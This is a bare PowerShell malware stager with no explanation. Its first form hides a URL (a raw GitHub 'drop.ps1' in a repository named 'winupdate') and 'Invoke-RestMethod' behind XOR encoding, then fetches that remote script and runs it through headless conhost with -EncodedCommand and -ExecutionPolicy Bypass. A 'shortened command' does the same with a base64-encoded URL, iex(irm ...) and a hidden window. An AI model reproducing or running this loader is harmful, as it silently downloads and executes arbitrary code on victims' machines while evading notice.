$inner = '$k=1869; $h=@(1829,1849,1849,1853,1854,1911,1890,1890,1855,1836,1850,1891,1834,1828,1849,1829,1848,1839,1848,1854,1832,1855,1838,1826,1827,1849,1832,1827,1849,1891,1838,1826,1824,1890,1834,1850,1844,1827,1916,1909,1915,1908,1890,1850,1828,1827,1848,1853,1833,1836,1849,1832,1890,1824,1836,1828,1827,1890,1833,1855,1826,1853,1891,1853,1854,1916).ForEach({[char]($_ -bxor $k)}); $u = -join $h; $cArr=@(1796,1827,1851,1826,1830,1832,1888,1823,1832,1854,1849,1792,1832,1849,1829,1826,1833).ForEach({[char]($_ -bxor $k)}); $c = -join $cArr; $pArr=@(1816,1855,1828).ForEach({[char]($_ -bxor $k)}); $p = -join $pArr; $params = @{$p=$u}; Start-Sleep -s 2; try { $d = & $c @params; .([scriptblock]::Create($d)) } catch {}'; $bytes = [System.Text.Encoding]::Unicode.GetBytes($inner); $enc = [Convert]::ToBase64String($bytes); conhost.exe --headless powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand $enc



#Shortened Command:
powershell -w 1 -c "start-process powershell -arg '-w 1 -c $b=''aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2d3eW4xODY5L3dpbnVwZGF0ZS9tYWluL2Ryb3AucHMx'';iex(irm([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($b))))' -WindowStyle Hidden"
